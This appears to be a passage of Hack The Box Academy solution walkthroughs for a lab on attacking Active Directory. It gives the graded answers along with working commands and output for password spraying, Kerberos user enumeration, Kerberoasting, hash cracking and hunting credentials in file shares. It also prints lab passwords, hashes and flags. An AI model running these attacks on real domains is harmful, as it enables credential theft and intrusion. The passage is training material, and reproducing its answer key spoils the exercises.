svc_qualys::INLANEFREIGHT:F9CAC827FD6ABFBF:4CF1F3B24BF1BF34D3ECC049D9FC7052:010100000000000086E60D7CDA82D801DFB87B40C430171C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080086E60D7CDA82D801060004000200000008003000300000000000000000000000003000006C04F59E654683B7ABEECE956F72B3A9164B0BD891DE9D612B30FF3E26D79F510A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000" > svc_qualysCapturedHash.txt
```

However, students will notice that there are new line characters in the hash (and if supplied to `Hashcat` as is, it won't work), to remove them, `Perl` can be used:

Code: shell

```shell
perl -p -i -e 's/\R//g;' svc_qualysCapturedHash.txt
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ perl -p -i -e 's/\R//g;' svc_qualysCapturedHash.txt
```

Now that the hash is in proper format, students at last need to crack it using `Hashcat`, utilizing hashmode 5600; students will find out that the plaintext password of the cracked hash is `security#1`:

Code: shell

```shell
hashcat -m 5600 -w 3 -O svc_qualysCapturedHash.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hashcat -m 5600 -w 3 -O svc_qualysCapturedHash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

SVC_QUALYS::INLANEFREIGHT:f9cac827fd6abfbf:4cf1f3b24bf1bf34d3ecc049d9fc7052:010100000000000086e60d7cda82d801dfb87b40c430171c0000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000700080086e60d7cda82d801060004000200000008003000300000000000000000000000003000006c04f59e654683b7abeece956f72b3a9164b0bd891de9d612b30ff3e26d79f510a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:security#1

<SNIP>
```

Answer: `security#1`

# Enumerating & Retrieving Password Policies

## Question 1

### "What is the default Minimum password length when a new domain is created? (One number)"

The `default minimum password length` when a new domain is created is `7`:

![[HTB Solutions/CAPE/z. images/8238fadad45be603ef06dd5eaac60d9e_MD5.jpg]]

Answer: `7`

# Enumerating & Retrieving Password Policies

## Question 2

### "What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)"

The value of `minPwdLength` is set to `8` in the `INLANEFREIGHT.LOCAL` domain:

![[HTB Solutions/CAPE/z. images/fe05fa1dfdfcf3ad4fc808927c8f2791_MD5.jpg]]

Answer: `8`

# Password Spraying - Making a Target User List

## Question 1

### "Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?"

After spawning the target machine, students first need to connect to it with `SSH` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.206.246

htb-student@10.129.206.246's password: 
Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|

Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

Students then need to use `Kerbrute` to enumerate valid domain usernames via Kerberos in the target domain:

Code: shell

```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -t 40
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -t 40

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 06/19/22 - Ronnie Flathers @ropnop

2022/06/19 07:03:17 >  Using KDC(s):
2022/06/19 07:03:17 >  	172.16.5.5:88

2022/06/19 07:03:17 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2022/06/19 07:03:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:bf29af9a9eff3a3fe290711ce468977f$bdbd4436852f9c18bc30155b7383b72892e853b50897d340d6c9443ba0e17d34c043e2878905646a8854f435b6d89e4d2796cfcc87aa8265b9f7f9a1aaffab3c3b22ce5053dbd67b8d3b4659eebedbfd163ae830d0b894cd7800515da15337d0a9a3b1bfb54c4dfe9882730c1ba5d855f17881a90a54984003843963d356dc2d1abc87958787ba48f8884fe2fc66932e3a50ffd5ff3ca1430c078e06c74eedd67353d980db442f10dedb975ed59bfcc23faf0946a01639d3fd8bc39674795332229b27ebce865c1d26ba023b8a1e6474a5a735cad85719f52725e3e0a72a1db7e6ee0e6c9a96ba9fdf5fc5adc1b3129b7cc8cd69900ac057f40bdca84036ec3176cfef40760af435f518
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 mmorgan@inlanefreight.local
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 rramirez@inlanefreight.local
2022/06/19 07:03:17 >  [+] VALID USERNAME:	 jwallace@inlanefreight.local

<SNIP>

2022/06/19 07:03:29 >  Done! Tested 48705 usernames (56 valid) in 11.986 seconds
```

From the output of `Kerbrute`, students will know that there are `56` valid usernames.

Answer: `56`

# Internal Password Spraying - from Linux

## Question 1

### "Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer."

After spawning the target machine, students first need to connect to it with `SSH` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.206.246

htb-student@10.129.206.246's password:

Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
 
Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

Afterward, students need to use `enum4linux` to gather a list of usernames to be added to a username list that is saved in a file:

Code: shell

```shell
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d "]" > validUsers.txt
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d "]" > validUsers.txt
```

Students now need to use `Kerbrute` to perform a password spraying attack using the usernames harvested by `enum4linux` and the password `Welcome1`; students will find out that the user account is `sgage`:

Code: shell

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validUsers.txt Welcome1
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validUsers.txt Welcome1

	__             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 06/19/22 - Ronnie Flathers @ropnop

2022/06/19 07:24:31 >  Using KDC(s):
2022/06/19 07:24:31 >  	172.16.5.5:88

2022/06/19 07:24:31 >  [!] lab_adm@inlanefreight.local:Welcome1 - [Root cause: KDC_Error] KDC_Error: AS Exchange Error: kerberos error response from KDC: KRB Error: (14) KDC_ERR_ETYPE_NOSUPP KDC has no support for encryption type
2022/06/19 07:24:31 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/06/19 07:24:31 >  Done! Tested 21 logins (1 successes) in 0.061 seconds
```

Answer: `sgage`

# Internal Password Spraying - from Windows

## Question 1

### "Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools\` directory and import `DomainPasswordSpray.ps1`:

Code: powershell

```powershell
Import-Module .\DomainPasswordSpray.ps1
```

```
PS C:\Tools> Import-Module .\DomainPasswordSpray.ps1
```

Students then need to run `DomainPasswordSpray` with the password being `Winter2022` and enter `Y` when prompted to confirm spraying:

Code: powershell

```powershell
Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spraySuccess.txt -ErrorAction SilentlyContinue
```

```
PS C:\Tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spraySuccess.txt -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2940 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2940 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2940 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y
```

After `DomainPasswordSpray` is run, students will find out quickly from its output that the user `dbranch` has the password `Winter2022`:

```
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Winter2022 against 2940 users. Current time is 6:22 AM
[*] Writing successes to spraySuccess.txt
[*] SUCCESS! User:dbranch Password:Winter2022
```

Answer: `dbranch`

# Credentialed Enumeration - from Linux

## Question 1

### "What AD User has a RID equal to Decimal 1170?"

After spawning the target machine, students first need to connect to it with `SSH` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.206.246

htb-student@10.129.206.246's password:

Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
                                                 
Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

Students then need to connect to the DC (`172.16.5.5`) using `rpcclient`:

Code: shell

```shell
rpcclient -U "" -N 172.16.5.5
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $rpcclient -U "" -N 172.16.5.5

rpcclient $>
```

Then, students need to use `queryuser` on the AD user whose `RID` is `1170`; students will find out that the user name is of the AD user whose `RID` is `1170` is `mmorgan`:

Code: shell

```shell
queryuser 1170
```

```
rpcclient $> queryuser 1170

	User Name   :	mmorgan
	Full Name   :	Matthew Morgan
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :

<SNIP>
```

Answer: `mmorgan`

# Credentialed Enumeration - from Linux

## Question 2

### "What is the membercount of the "Interns" group?"

Using the same SSH connection established in the previous question, students need to use `CrackMapExec` to enumerate groups to find the `membercount` of the `Interns` group, using the credentials `forend:Klmcargo2`:

Code: shell

```shell
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
<SNIP>

SMB         172.16.5.5      445    ACADEMY-EA-DC01  VPN Users            membercount: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Interns              membercount: 10

<SNIP>
```

Students will find out that the `membercount` is equal to `10`.

Answer: `10`

# Credentialed Enumeration - from Windows

## Question 1

### "Using BloodHound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer)"

Students first need to use `xfreerdp` to connect to the Windows spawned target machine, using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools` directory:

Code: powershell

```powershell
cd C:\Tools\
```

```
PS C:\Windows\system32> cd C:\Tools\
```

Students then need to run `SharpHound` to collect data, which will be saved inside a ZIP file for the later use of it in `BloodHound`:

Code: powershell

```powershell
.\SharpHound.exe
```

```
PS C:\Tools> .\SharpHound.exe

2022-06-19T07:09:03.9151760-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-19T07:09:03.9151760-07:00|INFORMATION|Initializing SharpHound at 7:09 AM on 6/19/2022
2022-06-19T07:09:04.2901796-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-19T07:09:04.7901748-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-06-19T07:09:35.0089854-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 66 MB RAM
2022-06-19T07:09:48.6808035-07:00|WARNING|[CommonLib LDAPUtils]Error getting forest, ENTDC sid is likely incorrect
2022-06-19T07:09:53.8526782-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-06-19T07:09:53.8526782-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-06-19T07:10:05.0402151-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 131 MB RAM
2022-06-19T07:10:18.0089422-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2022-06-19T07:10:18.0562045-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-06-19T07:10:18.2276952-07:00|INFORMATION|Status: 3810 objects finished (+17 52.19178)/s -- Using 129 MB RAM
2022-06-19T07:10:18.2276952-07:00|INFORMATION|Enumeration finished in 00:01:13.4401596
2022-06-19T07:10:18.7276775-07:00|INFORMATION|SharpHound Enumeration Completed at 7:10 AM on 6/19/2022! Happy Graphing!
```

Students then need to navigate the directory where `BloodHound` is and run it:

Code: powershell

```powershell
cd .\BloodHound-GUI\
.\BloodHound.exe
```

```
PS C:\Tools> cd .\BloodHound-GUI\
PS C:\Tools\BloodHound-GUI> .\BloodHound.exe
```

Afterward, students need to import the ZIP file generated by `SharpHound` into `BloodHound` by clicking on "Upload Data":

![[HTB Solutions/CAPE/z. images/f1c940837f162d303faa1fc7400cdacf_MD5.jpg]]

Then, students need to choose the ZIP file ending in "\_BloodHound":

![[HTB Solutions/CAPE/z. images/740bca5d5f2fe61c26e34ec0b904fabe_MD5.jpg]]

Under the "Analysis" tab, students need to choose the "List all Kerberostable Accounts" query and then count the resulting accounts that sum up to `13`:

![[HTB Solutions/CAPE/z. images/bb137e23bfc72079c9b0d806feefd28f_MD5.jpg]]

Answer: `13`

# Credentialed Enumeration - from Windows

## Question 2

### "What PowerView function allows us to test if a user has administrative access to a local or remote host?"

From the module section's reading, students will know that the `Test-AdminAccess` function allows testing if a user has administrative access to a local or remote host:

![[HTB Solutions/CAPE/z. images/418dce4ef189eb67f066e69e25e7282e_MD5.jpg]]

Answer: `Test-AdminAccess`

# Credentialed Enumeration - from Windows

## Question 3

### "Run Snaffler and hunt for a readable web config file. What is the name of the user in the connection string within the file?"

Using the same `xfreerdp` connection established in question 1 of this section, students need to go back to the privileged `PowerShell` shell, exit `BloodHound`, navigate back to `C:\Tools\`, and then run `Snaffler`:

Code: powershell

```powershell
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v -data
```

```
PS C:\Tools> .\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v -data

2022-06-19 07:36:17 -07:00 [Info] Parsing args...
2022-06-19 07:36:17 -07:00 [Info] Parsed args successfully.
2022-06-19 07:36:17 -07:00 [Error] Invalid verbosity level -data falling back to default level (info).
2022-06-19 07:36:18 -07:00 [Info] Getting users and computers from AD.
2022-06-19 07:36:18 -07:00 [Info] Got 548 computers from AD.

<SNIP>

<configuration>
  <connectionStrings>
    <add name="myConnectionString" connectionString="server=ACADEMY-EA-DB01;database=Employees;uid=sa;password=ILFREIGHTDB01!;" />
  </connectionStrings>
</configuration>
```

Students will discover that the user's name in the connection string is `sa`.

Answer: `sa`

# Credentialed Enumeration - from Windows

## Question 4

### "What is the password for the database user?"

From the output of `Snaffler` in the previous question, students know that the password for the database user is `ILFREIGHTDB01!`:

```
PS C:\Tools> .\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v -data

2022-06-19 07:36:17 -07:00 [Info] Parsing args...
2022-06-19 07:36:17 -07:00 [Info] Parsed args successfully.
2022-06-19 07:36:17 -07:00 [Error] Invalid verbosity level -data falling back to default level (info).
2022-06-19 07:36:18 -07:00 [Info] Getting users and computers from AD.
2022-06-19 07:36:18 -07:00 [Info] Got 548 computers from AD.

<SNIP>

<configuration>
  <connectionStrings>
    <add name="myConnectionString" connectionString="server=ACADEMY-EA-DB01;database=Employees;uid=sa;password=ILFREIGHTDB01!;" />
  </connectionStrings>
</configuration>
```

Answer: `ILFREIGHTDB01!`

# Living Off the Land

## Question 1

### "Enumerate the host's security configuration information and provide its AMProductVersion."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students then need to run the `Get-MpComputerStatus` Cmdlet; the host's `AMProductVersion` (i.e., `Antimalware Product Version`) is `4.18.2109.6`:

Code: powershell

```powershell
Get-MpComputerStatus
```

```
PS C:\Users\htb-student> Get-MpComputerStatus

AMEngineVersion                 : 0.0.0.0
AMProductVersion                : 4.18.2109.6
AMRunningMode                   : Not running
AMServiceEnabled                : False

<SNIP>
```

Answer: `4.18.2109.6`

# Living Off the Land

## Question 2

### "What domain user is explicitly listed as a member of the local Administrators group on the target host?"

Using the same `RDP` session established from the previous question, students need to run `PowerShell` as administrator then run the `net localgroup` on `Administrators`; students will find out that the domain user that is explicitly listed as a member of the local Administrators group on the target host is `adunn`:

Code: powershell

```powershell
net localgroup Administrators
```

```
PS C:\Windows\system32> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
INLANEFREIGHT\adunn
INLANEFREIGHT\Domain Admins
INLANEFREIGHT\Domain Users
The command completed successfully.
```

Answer: `adunn`

# Living Off the Land

## Question 3

### "Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer."

Using the same `RDP` session established from question 1 of this section, students need to run `PowerShell` as administrator then run `dsquery`, attaining the flag `HTB{LD@P_I$_W1ld}` in the description field of the account "bross":

Code: powershell

```powershell
dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description
```

```
PS C:\Windows\system32> dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description

  SAMAccountName    description
  krbtgt            Key Distribution Center Service Account
  bross             HTB{LD@P_I$_W1ld}
```

Answer: `HTB{LD@P_I$_W1ld}`

# Kerberoasting - from Linux

## Question 1

### "Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer."

After spawning the target machine, students first need to connect to it with `SSH` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.206.246

htb-student@10.129.206.246's password:

Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
                                                 
Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

Students then need to list `SPN` accounts on the DC, using the credentials `forend:Klmcargo2`:

Code: shell

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:Klmcargo2
     
<SNIP>

$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$c10f3438e08b2ea6d1e594f86f9a3098$061ffe6405f28cf4bf3cd6e1fe62afd134b10328462bd492a2550e6c071366a8f1034f75dfb5c0c5d80ecdbbe762b1d6f2cb280b6755f7ac4cde11ddfb49bbb16ee699a4c1961f40639e6ad2927969205bfba3116bd776a344de16a08d39ab2dab2d896e7b0f6612366107209903ae458843ab68c524df206aa3af095fcbd01783e805536351926405aef89d036377c1945b7cc3769be49589e2b9fb7e7f63b2847fee13e463bc472de19d64660780f6ab7ce6d47134eefabdc3d30855daef98350d4751fbf477bc887334a628ab176eb9358580bb952cf678a0125d94d3a593eecd7105f5b16ad57f702db3e4521775beb258f898243f5667064b4a33f71cf9aa774a9afca992524fcb58e9dbe1fca4ee46afcf6c40a1575c025946bf4e2291235c8caf231df3397989f2fd89c5ede65f37ded7cf322da856c42124d0ce2e03fc027fba6e89b1a4afdc54b7ff6d7991d2e472da24fddd8a2b89cbbee52d30e9af6f8fd6c394041528fcbbec69376525899b1bd2e952ca223291ff1c4c4d00cfe84396da672f58f902fce25329b3b9463a1d08e14dfc18f80093f7be5abeea94ce854499a156e24e134fe8ea0b63770fa905722359af51315a1651032a2a87ead7b2e744eb6686d3ff2239c328f67d8602cf0b4c7817554dba4c5575b4488d72a6d8ff0c60d7fd1840b8c47d450d78031d6c07bd3071f9f0cba9cd10571445a193e47b60ee8cbc7ed36cc174a77071b0cb1322e86530c17e64112f9cf6de670959b90bdafa6722960bb51abbe3e27ded9da7bedd7a70799ae7c3449f0569e9886aa22aa493f071c318f8d34c8fb36fabe3c8a623409918a89e6c71ef39572cba37abfa53539a7414313dbdee2f9e87fab3c97fa7e2b5207b542b46962502f3edf63d287288872a66917d63d2bd956a7e9b946f4ffab08cb6ef9ba5c1de13b2cbb9e696eaa386726e0911c8b66d9d65907b800ee01883d441ad728d2874dcd52bc3e8cba0e7210290d7b08d638accc55d3d75192eac482912dfedda54c5f7cc9d2f29652d42cda8fbb8140b50eee6bacdc5faf8672c377f24569cee7b80f21940f4e180a311a1779aefe2440ced6792d8c37fd3524f523feb6884ff2026ea4c1ec03cb916a5256301d923907fca468634ddc9bdce6f4f6dd2818db41c8509b3c9150cc2ec6fb6f998ba65c6676ce098e40a83d559cb6a244bd9dd1f9dd2cbe9fc76fe8a1ddbe40ae27945f8cc59362212b58ced3a2f6c9c18dd794c25f1bd26365685d49cdc28cec473ac567a94a3fef3ca3284ddff83b5346e090f583517b89fff81cf3367471676ec76180e24b0c203c67c55cffac581ad0e079ad8ef0be3d59b1b678d09990852f79f08e48cfdd8d262137bc48486ead79a2e41c4933bf08e5852b143c6250b6a282195b8147565b0a726
```

Subsequently, students need to save the hash of the `SAPService` account into a text file and use `Hashcat` to crack it, utilizing hashmode 13100; students will find out that the plaintext password of the cracked hash is `!SapperFi2`:

Code: shell

```shell
hashcat -m 13100 -W 3 -O SAPHash.txt /usr/share/wordlists/rockyou.txt --force
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $hashcat -m 13100 -w 3 -O SAPHash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5-275-gc1df53b47) starting

<SNIP>

